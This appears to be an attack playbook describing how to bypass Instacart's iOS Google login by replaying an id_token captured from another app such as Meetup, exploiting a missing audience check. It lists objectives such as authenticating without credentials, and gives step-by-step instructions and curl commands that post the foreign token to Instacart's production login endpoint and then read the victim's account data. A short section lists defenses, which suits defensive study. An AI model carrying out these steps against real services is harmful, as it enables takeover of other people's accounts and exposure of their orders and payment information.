# Bypass-Instacart-Google-Auth-with-Foreign-ID-Token

## Summary

This procedure exploits the lack of origin verification for Google ID tokens in Instacart's iOS app login API, allowing attackers to authenticate using tokens generated by third-party apps like Meetup, resulting in unauthorized access to user accounts.

## Description

The Instacart iOS app's Google login feature uses the endpoint https://www.instacart.com/api/v2/users/google_login_auth to process id_tokens without validating that they were issued for Instacart's specific client_id, violating Google's OAuth guidelines. An attacker can intercept a valid id_token from another app's Google Sign-In flow and submit it to Instacart's API, tricking the backend into granting access. This enables compromise of Instacart accounts via malicious or compromised third-party apps, potentially exposing user data, order history, and payment information. The attack requires no privileged access and works over standard HTTPS.

## Requirements

1. Mobile proxy tool (e.g., Burp Suite or Charles) to intercept app traffic
2. Access to a third-party app with Google Sign-In (e.g., Meetup iOS app)
3. API testing tool like curl for request submission
4. Network connectivity to Instacart and Google services

## Defense

Defensive measures and detection strategies:

- Implement server-side verification of id_token's aud (audience) claim to ensure it matches Instacart's client_id
- Use Google's tokeninfo endpoint or library to validate token issuer and origin
- Monitor for anomalous login patterns, such as logins from mismatched client_ids
- Enforce app-specific signing or additional token binding

## Objectives

1. Authenticate to Instacart without valid credentials
2. Access user account data and perform actions
3. Demonstrate token reuse vulnerability across apps

## Instructions

### Step 1: Intercept and Identify the API Endpoint

**Context**: Capture the Google login request from the Instacart iOS app to understand the endpoint and parameters.

Use a mobile proxy to monitor traffic during a Google login attempt in the Instacart app. Note the POST endpoint and parameters, especially id_token.

### Step 2: Generate and Capture Foreign ID Token

**Context**: Obtain an id_token from a third-party app to use in the bypass.

Install the Meetup app, start a Google Sign-In flow, and intercept the network request containing the id_token. Extract the token string, access_token, and client_id.

### Step 3: Submit the Token to Instacart API

**Context**: Replay the foreign token to authenticate.

Construct and send a POST request to the endpoint with the captured values.

```bash
curl -X POST https://www.instacart.com/api/v2/users/google_login_auth \
  -d 'access_token=extracted_access_token' \
  -d 'client_id=meetup_client_id' \
  -d 'id_token=captured_id_token' \
  -d 'login_only=true' \
  -d 'read_terms=true' \
  -H 'Content-Type: application/x-www-form-urlencoded'
```

> This command sends the foreign token; expect a JSON response with authentication success if vulnerable.

### Step 4: Validate Access

**Context**: Confirm the bypass by accessing protected resources.

Use the returned session token to query user data.

```bash
curl -X GET https://www.instacart.com/api/v2/users/me \
  -H 'Authorization: Bearer returned_session_token'
```

> Successful response includes user details, indicating account takeover.
